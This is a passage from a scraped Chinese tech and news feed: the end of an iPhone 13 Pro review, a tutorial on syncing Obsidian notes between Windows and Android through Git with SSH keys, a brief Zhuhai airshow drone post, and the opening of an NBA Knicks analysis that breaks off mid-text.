src=\"https://cdn.sspai.com/2021/09/27/de1f61bf12eaefa1bcda894a9e249833.jpeg\"><figcaption>77 mm</figcaption></figure><p>有了 Smart HDR 4 合成算法之后，iPhone 13 Pro 在应对一些光线强烈或者复杂的场景时也能保持稳定发挥。特别在类似「夕阳的余晖」或者「多云的蓝天」这样的时刻，能呈现顺滑的冷暖或云层变化。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/af266d0ab1ca2f50e37160df9c828a29.jpeg\"><figcaption>26 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/05cab7832cd8ca2d9673bae77e45c7f6.jpeg\"><figcaption>13 mm</figcaption></figure><p>iPhone 13 Pro 进一步加强了夜景拍摄能力，主摄使用了 iPhone 12 Pro Max 上首次搭载的传感器位移防抖技术，让夜景拍摄时可以借助更低的 ISO 和曝光时间来获得更明亮且纯净的画面。超广角也进一步增大了光圈和进光量，增加了暗光及夜景中的可用度。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/0712449b2964d1447325b491d8a2544d.jpg\"><figcaption>26 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/28/efa75a54216067b45036ab8765a73933.jpeg\"><figcaption>13 mm</figcaption></figure><p>严格地讲，即使开启了夜景模式，iPhone 13 Pro 的绝对画质也谈不上好。但 iPhone 的强项是对氛围的捕捉和还原能力很强，这组照片中就很好地保留了营地空旷却有一点点温馨的状态。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/e12fa74f0c28d01cdce78412d0e2aef7.jpeg\"><figcaption>13 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/719fc66bd3e1d292645e13db73a98921.jpeg\"><figcaption>77 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/1428f55086a2aab7092ab86373c3ae3f.jpeg\"><figcaption>77 mm</figcaption></figure><p>顺便说说 iPhone 13 Pro 上新增的 77 mm 摄像头。在发布会之前，我完全没想到 Apple 把长焦搞到了 70 mm 的焦段上。有一点需要注意：70 mm 焦段适合的题材是静物和人像，如果你期待把它当成一颗风景镜头来用，其拍摄效果可能会令你失望。相反，如果熟悉了 70 mm 的特点，充分利用其自然的空间压缩感，拍摄效果就会挺不错。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/e6805434413863e3043368677392ed99.jpg\"><figcaption>77 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/367082f73f528e0e55d4137713aa29bf.jpg\"><figcaption>77 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/fae0cb795c20f8ecec2bcbd3b793644c.jpeg\"><figcaption>77 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/a54c8ddf1c2520f58aa9b754283ef42f.jpeg\"><figcaption>77 mm，使用 NOMO RAW 拍摄</figcaption></figure><p>焦段的增长让 iPhone 13 Pro 长焦镜头的光圈相较前代变小了，加上传感器面积没有增大，通光量反而减少了。从我的实际拍摄感受来说，画质也确实不及从前。再加上 70 mm 焦段可以拍的题材明显不及 50 mm 普世，不禁让我对 Apple 此次对长焦镜头的调整感到困惑。 不过，来就来了，等我再用一段时间，然后找机会谈谈 70 mm 焦段的使用心得吧。</p>\n<p>iPhone 13 Pro 这次还加入了微距摄影模式，且无论拍照还是拍影片都可以使用。这个模式对拍摄者的观察力要求更高，要有「什么都想凑近瞧瞧」的好奇心才能拍出好玩的照片。微距模式还很适合拍静物，用来给《新玩意儿》投稿（强烈暗示</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/30/7d2a46efa27ceb5646ca699d8d1dbc2e.jpg\"><figcaption>微距模式很适合拍物品近景</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/29/589dee669ea8a6e169b23bb01cccfc85.jpg\"><figcaption>微距下的阿司匹林泡腾片</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/30/c0ef73bfe059bf8961350be60bad5548.jpeg\"><figcaption>街边石柱一角，利用微距的放大作用并在后期加一点对比度，可以粗略地模拟出一种月球表面的效果</figcaption></figure><p>由于我平时很少拍影片，拿到 iPhone 13 Pro 之后我只重点玩了玩全新的「电影效果」模式。在该模式下，系统会根据画面里的前后景关系来自动虚化并切换焦点。经过简单的研究，我发现「电影效果」不是只进行简单的背景虚化和前后景演算，它还会通过运镜的方向和画面里的元素来预判拍摄者的意图，然后完成平滑的主体切换。</p>\n<p>以下面这段短片为例，开始阶段的画面主体是老麦的特斯拉，iPhone 发现有人上车，就把焦点迅速定在了车上。随后，镜头向右移动，iPhone 观察到了远处有人运动，于是逐渐切为远景，并虚化了车辆。在整个过程中，iPhone 13 Pro 对光圈的控制很合理，没有进行夸张的过渡虚化。如果想拍摄一段有剧情的短片，这样运镜效果已经足够通过画面交代必要的讯息了。</p>\n<video class=\"ss-videoSource video-js\" controls=\"\" poster=\"\" title=\"\" type=\"video/mp4\" preload=\"none\"><source src=\"https://cdn.sspai.com/video/iphone13pro/iphone13pro_cinematic_mode.mp4\" type=\"video/mp4\"></source></video><p>如果对系统自动生成的切换效果不满意，还可以在后期手动调整。画面中黄框内的元素就是当前镜头焦点的位置，白框则是可以切换的对象。调整焦点后，系统会自动计算相应的景深和虚化效果。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/bb6506c5936c6939f71afd8ebbe93f75.jpg\"></figure><p>iPhone 影像存在两个老问题，其一是过度锐化，其二是部分场景的算法不太对，导致画面「塑料感」很强，这两个问题在 iPhone 13 Pro 上依然存在。过度锐化会让有些照片看起来直愣愣的，显得有点傻；「塑料感」则会破坏画面的颜色协调和立体感。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/110dde5d8c13d68505118a32369f9432.jpeg\"><figcaption>水波纹已经硬得像石头了</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/30/34d330f4875a688c63b9a50d10af713b.jpg\"><figcaption>对绿色的还原令人梦回土味表情包</figcaption></figure><p>这两个问题都涉及「光学成像」和「计算成像」之间的比重与协调。相较之前的产品，iPhone 13 Pro 已经在一定程度上修正了过度锐化的成分，但在许多场景里还是很明显。而且，iPhone 13 Pro 不允许用户自主开关 HDR，即使想要在大光比场景下刻意保留阴影都没得选，不免显得有点激进。</p>\n<p>此外，iPhone 13 全系都已支援拍摄 DNG 格式的 ProRAW 照片，但系统相册自带的图片编辑器实在太弱，没有直方图和曲线，交互也太简单，不适合处理 RAW 文件。既然 iPhone 已经走上了「原生支援 RAW 格式拍摄」这条路，我期待 Apple 可以走远一点，在未来的 iOS 中预置一套能搞定 RAW 的图片处理工具。</p>\n<p>总体来说，iPhone 老用户在 iPhone 13 Pro 上能获得的影像体验是「延续优势」。如果你已经熟悉了它擅长的场景，就能用它拍出好照片。反之，尽量避免用它挑战自己不擅长的拍摄方式，减少无用废片的出现。</p>\n<h2>续航：确实更好了</h2>\n<p>在新 iPhone 的媒体测评解禁之后，我第一时间听到最多的声音不是关于性能和影像的，而是「续航变好了」。上手之后，我的实际感受也是如此，续航确实明显变好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/b933a05f54d0624ef7bfad63849b48f8.jpg\"></figure><p>拿到机器的第二天，我就去了深圳湾附近拍照。下午四点钟左右带着 80% 的电量出门，晚上八点左右以不到 10% 的电量收工回家，期间的四个小时里我都在一边听着播客，一边不间断地拍照，而且手机基本全程处于开着相机取景器的状态。在如此高频高强度的使用下，iPhone 13 Pro 还能有这样的续航表现已经相当不错。</p>\n<p>这样的电量表现也增强了我对 iPhone 的信心。于是，在回家的地铁上，虽然我手机只剩下 8% 的电量，我依然大胆地打开 YouTube 看了一路影片，还顺带翻看了一下拍过的照片。一小时的路途之后，以 5% 左右的电量顺利回到家，没有能体验到「手机没电了但还能刷地铁卡」的功能。</p>\n<p>既然能顶得住突击式的高强度使用，iPhone 13 Pro 在日常使用中的续航表现就更不是问题了，我甚至已经改变了到家先给手机插上电源的习惯，对手机电量降至 50% 以下的焦虑感也少了很多。总体来说，iPhone 13 Pro 的续航提升虽然没有 MacBook 从 Intel 芯片转至 M1 之后的变化得那么夸张，但肯定能明显感受到区别。</p>\n<h2>信号：史上最强</h2>\n<p>如果这一代 iPhone 有什么改变让我觉得「史上最强」的话，手机信号是我第一时间能想到的功能点。「深圳手机信号差」几乎已经是全国人民都知道的惨痛现况，而我恰好又在同时移动、联通、电信三家运营商的手机卡，所以对「深圳的手机信号到底有多差」有着切身体会。在无法改变运营商基建水平的前提下，iPhone 13 Pro 的出现意外地拯救了我的行动网络使用体验。</p>\n<p>首先，iPhone 13 Pro 拥有很强的 5G 在线能力，而且是我用过的手机里最强的。在一些其它手机会掉至 4G 乃至断线的区域，iPhone 13 Pro 也能保持 5G 在线且可用。虽然我很早就用上了 5G 套餐和 5G 手机，但 iPhone 13 Pro 到来后的这一周，我才真正觉得「5G 终于可以用起来了」。</p>\n<p>其次，iPhone 13 Pro 在信号离线之后的重新上线能力变强了。我家进电梯后，手机会在部分楼层失去信号，但 iPhone 13 Pro 只有在电梯持续上下行时才会短暂掉线，而且只要电梯门一打开，信号就会快速迅速恢复。我此前用过的手机一旦离线都需要完全离开电梯后才能恢复信号，部分机型甚至要走出很远才行，而 iPhone 13 Pro 则很快就能回到在线状态。</p>\n<p>由于我在 iPhone 13 Pro 上只使用过中国移动和中国电信的 SIM 卡，所以我又询问了拿到新机且在用中国联通的朋友谈谈他对讯号强度的感受。据朋友反馈，从手机显示的强度来看，中国联通的讯号表现也更稳定了，譬如此前大部分时间讯号不满格的场景在 iPhone 13 Pro 上都变成了满格。另外，在类似坐车离开隧道的场景下，信号恢复得很快，和我进出电梯时的感觉很相似。虽然这位朋友所在城市的中国联通讯号强度没有深圳那么差，不过他的体验也能一定程度上说明 iPhone 13 Pro 在讯号强度上的整体提升。</p>\n<p>另外还有消息说联通和 Apple 联合优化了 5G 表现，如果读者中有拿到了新机的联通用户，也可以在评论区说说实际感受。</p>\n<p>总体来说，iPhone 13 Pro 在信号上的优秀表现甚至让我产生了「是不是哪里不对」的错觉，我也终于可以在坐地铁上班的全程都流畅观看 YouTube，不用再像以往一样——站在地铁的安检处，因为没有讯号打不开健康码而尴尬。</p>\n<h2>总结：好用，耐用，慢慢用</h2>\n<p>这一代的 iPhone Pro 是能踏踏实实用上两年的好手机。我在完成本文之后，唯独结尾部分想了很久不知道如何动笔，因为结论实在太简单——只要你想买 iPhone，买 iPhone 13 Pro 就行了。</p>\n<p>对于看客们来说，iPhone 13 Pro 身上没有什么能把人下巴吓掉的噱头，但对于用户而言，这代 iPhone 改进了此前产品上的一些小问题，反而带来了更完整、扎实的使用体验。</p>\n<p>用 Apple 自己的 slogan 来结束这篇体验吧——</p>\n<p>iPhone 13 Pro，强得很。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69007"},{"title":"想在电脑和 Android 端同步 Obsidian 笔记？让 Git 帮你牵线搭桥","date":"2021-09-30 06:21:00","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>如果你使用 <a href=\"https://help.obsidian.md/Obsidian/Android+app\" target=\"_blank\">Android 版 Obsidian</a>，一个必须考虑的问题就是如何与电脑端同步笔记。</p>\n<p>对此，诚然可以选择官方的 <a href=\"https://help.obsidian.md/Licenses+%26+add-on+services/Obsidian+Sync\" target=\"_blank\">Obsidian Sync</a> 服务，或者使用 Dropbox 等第三方同步工具，但我最推荐的还是<strong>使用 Git 同步</strong>。理由在于：</p>\n<ul>\n<li>相比其他解决方案，Git 是开源的，不仅免费，而且安全性有保证；</li>\n<li>作为最先进的分布式版本控制系统（没有之一），用 Git 可以方便地实现版本回溯和协同编辑等功能；</li>\n<li>Git 支持多种操作系统（Windows、macOS、Linux、Android、iOS），可以按需托管在国内外多家平台上（国外的 <a href=\"https://github.com/\">GitHub</a>、<a href=\"https://about.gitlab.com/\">GitLab</a>，国内的 <a href=\"https://gitee.com/\">Gitee</a>、<a href=\"https://coding.net/products/repo\">CODING</a>）。</li>\n</ul>\n<p>当然，<strong>用 Git 同步的方案也有局限</strong>，包括有一定的学习成本，对纯新手不友好；多设备同时编辑容易产生冲突；以及需要另行手动备份存档等。</p>\n<p>但瑕不掩瑜，Git 仍然是我在 Windows 桌面端和 Android 端同步 Obsidian 的首选。本文就为大家介绍我的具体实现方案。</p>\n<p>（<strong>注：</strong>行文简洁起见，本文假定读者掌握命令行环境的基本操作，对于 Git 的功能和机制有初步了解。如果你不了解Git，那么本文食用起来可能会比较困难，不妨先通过<a href=\"https://www.liaoxuefeng.com/wiki/896043488029600\">廖雪峰的 Git 教程</a>简单学习后再来尝试。）</p>\n<h2>Windows 桌面端的准备工作</h2>\n<h3>第一步：安装 Git</h3>\n<p>在开始之前，请确保自己的 Windows 系统中已经安装了 Git。如果还没有安装，可以参考<a href=\"https://www.liaoxuefeng.com/wiki/896043488029600/896067074338496\">廖雪峰的教程</a>。如果你已经安装了，那么可以跳过这一步。</p>\n<h3>第二步：在 Git 托管平台中新建仓库</h3>\n<p>接下来，我们在自己选用的 Git 托管平台上新建一个笔记专用仓库。</p>\n<p>考虑到国内用户的访问便捷程度和中文支持，本文将主要使用国产服务 Gitee 演示（<a href=\"https://gitee.com/\">官网注册链接</a>），并简单说明更为主流的 GitHub 平台的对应操作。</p>\n<ul>\n<li>\n<strong>如果使用 Gitee：</strong>在顶部导航条点击「+」&gt;「新建仓库」，根据提示填写信息即可（暂不勾选给出的初始化选项）。</li>\n<li>\n<strong>如果使用 GitHub：</strong>在顶部导航条点击「+」&gt;「New Repository」，根据提示填写信息即可（暂不勾选给出的初始化选项）。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/61f5b3c159cda3f8f99ec3328995cdeb.png\"></figure><h3>第三步：生成 SSH 密钥</h3>\n<p>接着，我们需要生成一个 SSH 密钥（SSH Key），用于在本地和远程 Git 仓库同步时验证身份。</p>\n<h4>方法一：自动配置</h4>\n<p>为方便新手用户，我准备了一个配置脚本，按照如下步骤运行即可完成配置：</p>\n<ol>\n<li>创建一个空白的 txt（后缀为 <code>.txt</code>）文档；</li>\n<li>将下面的代码复制粘贴到上面的空白文档中，将其中标注的用户名、邮箱等信息修改为你自己的相应信息，然后保存；</li>\n<li>修改文档后缀为 <code>.sh</code> 并保存，双击执行脚本。</li>\n</ol>\n<pre class=\"language-shell\"><code>#!/bin/bash\n\nsplitLine=\"=====================================================\"\nuserName=\"这里改成你的用户名\"\nemail=\"这里改成你的Email\"\n\n# 配置 git 用户名和邮箱\ngit config --global  user.name ${userName}\ngit config --global user.email ${email}\ngit config --global  --list \necho \"Enter 或者 y 键确认\"\nssh-keygen -t rsa -C \"${email}\"\n\n# 打印公钥\necho \"复制保存下面的公钥添加到远程仓库\"\necho ${splitLine}\ncat ~/.ssh/id_rsa.pub\necho ${splitLine}\necho \"按任意键退出\"\nread -n 1\necho \"继续运行\"</code></pre>\n<p><strong>注意：</strong></p>\n<ol>\n<li>如果你本地之前生成过 SSH，那么脚本会提示你是否覆盖，此时输入 <code>y</code> 回车即可。</li>\n<li>如果操作中途不小心关掉了脚本窗口，不要慌，双击重新执行脚本即可。</li>\n<li>执行过程中会出现如下图所示的四次提示确认步骤，简单起见，建议大家<strong>直接回车</strong>不设置参数（当然如果你明白这些步骤的具体含义，也可以设置需要的参数）。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/5890d693616616ce19b4e15154a45478.png\"></figure><p>脚本执行完后，<strong>将分割线里面的内容复制出来保存好</strong>。后面会用到。</p>\n<h4>方法二：手动配置</h4>\n<p>如果你希望自己动手完成配置过程，下面介绍手动配置方法，这与前述脚本是等效的。</p>\n<p>在空白位置点击鼠标右键，选择 <strong>Git Bash</strong>（或者用你习惯的其他终端模拟器，如 Windows Terminal 等访问 Bash 亦可）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/e8dc6683e82f0a0f4a7a6bd1bfdb132b.png\"></figure><p>在弹出的 Bash 窗口中，输入下面的命令<strong>配置用户名</strong>：</p>\n<pre class=\"language-shell\"><code>git config --global  user.name 你的用户名</code></pre>\n<p>以及用下面的命令<strong>配置邮箱</strong>：</p>\n<pre class=\"language-shell\"><code>git config --global user.email 你的邮箱</code></pre>\n<p>完成前两步后，可以用下面的命令检查<strong>是否配置成功</strong>：</p>\n<pre class=\"language-shell\"><code>git config --global  --list </code></pre>\n<p>如下图所示，如果返回的结果正确显示了你输入的用户名和邮箱，说明配置是正确的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/747b64e705ff56751d1ed95e8126b99b.png\"></figure><p>接着，输入下面的命令<strong>生成 SSH Key</strong>。参考上面脚本教程的截图，按四个回车即可。</p>\n<pre class=\"language-shell\"><code>ssh-keygen -t rsa -C \"你的邮箱替换中文\"</code></pre>\n<p>最后，用如下命令<strong>显示生成的公钥</strong>，将其<strong>复制出来备用</strong>：</p>\n<pre class=\"language-shell\"><code>cat ~/.ssh/id_rsa.pub</code></pre>\n<h3>第四步：上传 SSH 公钥</h3>\n<p>下面，我们将生成的 SSH 公钥上传至 Git 托管平台。</p>\n<ul>\n<li>\n<strong>对于 Gitee：</strong>点击导航栏右上角头像，选择「设置」，然后在侧边栏菜单选择「SSH 公钥」，填入上一步保存的公钥内容并保存确认。</li>\n<li>\n<strong>对于 GitHub：</strong>点击导航栏右上角头像，选择「Settings」，然后在侧边栏菜单选择「SSH and GPG keys」，填入上一步保存的公钥内容并保存确认。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/cd494a41d331643c00c6d1738bd39d63.png\"></figure><h3>第五步：配置本地 Obsidian 仓库</h3>\n<p>下面，我们在本地配置用于同步的 Obsidian 笔记文件夹。</p>\n<p>从 Gitee 或 GitHub 网页端访问刚才新建的仓库，由于尚未初始化，网页上会展示下图所示的配置指引：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/37bde3db137342b326215438813da7eb.png\"></figure><p>这里，我们按其中的「创建 Git 仓库」一节配置。</p>\n<p>具体而言，进入你用作 Obsidian 笔记库的文件夹，进入后在空白处点击右键进入 Bash，依次执行如下命令：</p>\n<pre class=\"language-shell\"><code>touch README.md\ngit init\ngit add README.md\ngit commit -m \"first commit\"\ngit branch -M main\ngit remote add origin \"替换为上图中本条命令位置提示的远端地址（形如 git@gitee.com:user/repo.git）\"\ngit push -u origin main</code></pre>\n<h3>第六步：配置 Git 仓库同步</h3>\n<p>完成了本地仓库的配置，接下来要解决的就是在本地和远端之间推送和拉取笔记文件。这里，固然可以定期、手动通过命令行的 <code>git</code> 命令来同步，但那未免繁琐。</p>\n<p>笔者惯用的方式是使用 <a href=\"https://www.gitkraken.com/\" target=\"_blank\">GitKraken</a>。这是一款免费、图形界面的 Git 管理工具。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/00a7e28f5f7bd06c3422e3b95c2a4331.png\"></figure><p>安装后，先点击左上角的文件夹图标，选择本地 Obsidian 笔记库打开。然后即可通过工具栏按钮快捷地同步，或者在主界面中追踪同步历史等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/03439bea9dbb991a76b04e80a5044cc0.png\"></figure><p>除了用 GitKraken 外，你也可以通过 <a href=\"https://github.com/denolehov/obsidian-git\" target=\"_blank\">Obsidian Git 插件</a>，直接在 Obsidian 内部完成仓库的同步。</p>\n<h2>Android 端的准备工作</h2>\n<p>Android 端的配置相对简单，除了 Obsidian app，只需要另外安装一个 Git 客户端即可。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://play.google.com/store/apps/details?id=md.obsidian\"> </span><p>这里，我推荐使用 MGit，它是笔者能找到的最符合个人需求的 app；其他的如 GitJournal 等 app 多少有些小问题。如果你有更好用的推荐，欢迎在评论区分享。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://play.google.com/store/apps/details?id=com.manichord.mgit\"> </span><p>MGit 的配置步骤如下：</p>\n<ol>\n<li>在设置界面的「repos 的根存储位置」拟用于存放 Android 设备上 Obsidian 笔记的路径：</li>\n<li>在设置页面，点击「SSH Keys」&gt;「+」，新建 SSH 密钥；</li>\n<li>参考前面的方法，将生成的公钥上传到 Gitee 或 GitHub；</li>\n<li>从 Gitee 或 GitHub 复制 SSH Remote 地址（即上述 Windows 配置部分第五步用到的地址，也可以在仓库主页面点击「下载/克隆」（GitHub 点击「Code」）查看），填入远程地址，点击克隆。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/dd5023c1632a7d143571fa07d27314cd.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/cb40697d52165ac965d48e022712886a.png\"></figure><p>成功之后，打开 Obsidian for Android。一般来说，Obsidian自动扫描到你克隆到手机的工作空间。如果没有扫描到，那么手动从 Obsidian 进入上述步骤设置的仓库路径，用作工作空间即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/24f28d81a3353976e0f1829326232094.png\"></figure><h2>结语</h2>\n<p>细心的朋友可能已经看出来了，就是 Obsidian 的工作空间在PC和手机上都是通用的。这方面要为 Obsidian 的开发团队点赞。</p>\n<p>不过，个人不建议在手机端编辑文档。因为手机端屏幕太小影响体验和发挥，只负责查阅即可，编辑还是放到 PC 端比较好。</p>\n<p>如果大家对本文方案有什么更好的建议，可以在评论区提出。</p>\n<hr>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67698\" target=\"_blank\">或许也是你「入坑」的好机会：Obsidian 移动端上手体验</a></li>\n<li><a href=\"https://sspai.com/post/65316\" target=\"_blank\">Obsidian 的 Android 伴侣：GitJournal 使用指南</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68989"},{"title":"多款新型无人机首次亮相珠海航展。你最关注哪种类型无人机？你对我国无人机的发展有哪些期待？","date":"2021-09-30 05:46:50","description":"\n<p>无侦-7、无侦-8、攻击-2无人机，你最看好哪一个呢？小编带你一起去看。</p>\n<a href=\"https://www.zhihu.com/video/1426894219856703489\">小编带你看航展 之“无争锋</a><a href=\"https://zhuanlan.zhihu.com/p/415724921\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-3a90a264b29ab29b788b1c4a10dc7118_bh.jpg\" data-image-width=\"6720\" data-image-height=\"4204\" class=\"internal\">空军在线：小编带你看航展 第三弹：“无人”争锋！</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/kong-jun-zai-xian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">空军在线</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>延伸阅读：<br><a href=\"http://www.zhihu.com/question/301360704?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价珠海航展上展出的彩虹七号无人机？</a><br><a href=\"http://www.zhihu.com/question/301377877?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价2018年珠海航展上展出的彩虹七无人机？</a><br>\n","link":"http://www.zhihu.com/question/489928113/answer/2147976666?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"沃克和富尼耶来到纽约，但尼克斯还是罗斯的球队？","date":"2021-09-30 04:10:28","description":"\n<p>NBA发言人迈克-巴斯表示，<b>因为不接种疫苗违反当地疫苗接种规定而缺席比赛的球员，不会获得相应的薪水</b>。</p>\n<p>众所周知的是，旧金山和纽约对于球员在当地主场比赛有严格的疫苗接种规定。而身处两地的三支球队里，<b>只有纽约尼克斯一家已经全员接种疫苗</b>。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-47c71b3b5987047600b6ca2527442d20_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"606\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-47c71b3b5987047600b6ca2527442d20_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>相对而言，他们的确定性更大，至少不存在某位球员缺席一半赛季的可能性，所以今天咱们来聊聊这支纽约人心目中的正统血脉，尼克斯队。</p>\n<hr>\n<p>纽约上赛季组了一支平民球队——球队里名头最响亮的人物是罗斯和兰德尔，但罗斯拿MVP已经是十年前了，兰德尔之所以为人所熟知，主要是因为他在湖人呆过——然后请来治军严厉且以防守著称的锡伯杜教练。</p>\n<p>最终这支被称作“烂泥”的球队，在并不被外界关注的情况下，一鼓作气冲上了东部前四，给球迷们制造了巨大的惊喜。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-dea53429835c5c2964d8bc49edcabd22_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"787\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-dea53429835c5c2964d8bc49edcabd22_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>但细细想来，<b>这个惊喜似乎有些虎头蛇尾</b>。任何一支东部第四的球队被以下克上，以“绅士横扫”的姿态首轮出局，都将面临球迷的各种指摘，更何况他们还是唯一一支季后赛首轮被以下克上的球队。</p>\n<p>除非他们是纽约，是已经接近小十年没进过季后赛，一度被球迷认为烂到无可救药的纽约。<b>因为他们是纽约，所以进了季后赛就算成功</b>，若是其他东部强队，早就被喷的翻出第十八代户口本了。</p>\n<hr>\n<p>但纽约这个“虎头蛇尾”的成绩，也和他们的<b>阵容</b>脱不开干系。</p>\n<p>上赛季纽约的首发是小佩顿+布洛克+巴雷特+兰德尔+诺埃尔，罗斯、伯克斯、奎克利和吉布森撑着替补。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-47f0495182a7f433f4792459e153ee9a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1021\" data-rawheight=\"685\" class=\"origin_image zh-lightbox-thumb\" width=\"1021\" data-original=\"https://pic3.zhimg.com/v2-47f0495182a7f433f4792459e153ee9a_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这套首发阵容，一眼看过去最大的特点就是<b>能防</b>，每个点都能保证平均水准以上的防守能力。</p>\n<hr>\n<p>但再仔细一看，这套阵容不能防不行，因为进攻太差，只能用防守来弥补。小佩顿除了持球组织一下，个人进攻能力基本为0；布洛克是个3D类型的投手；巴雷特和诺埃尔都没有三分。</p>\n<p>所以<b>纽约上赛季场均得分联盟倒数第五，场均失分104，和湖人齐平</b>。也正因为如此，兰德尔被逼得成了球队的组织前锋，进攻端三分、强攻、组织样样都得他来，兰德尔也借此进了全明星。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2bd41ede98552cade9cdfe5fef9879a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" 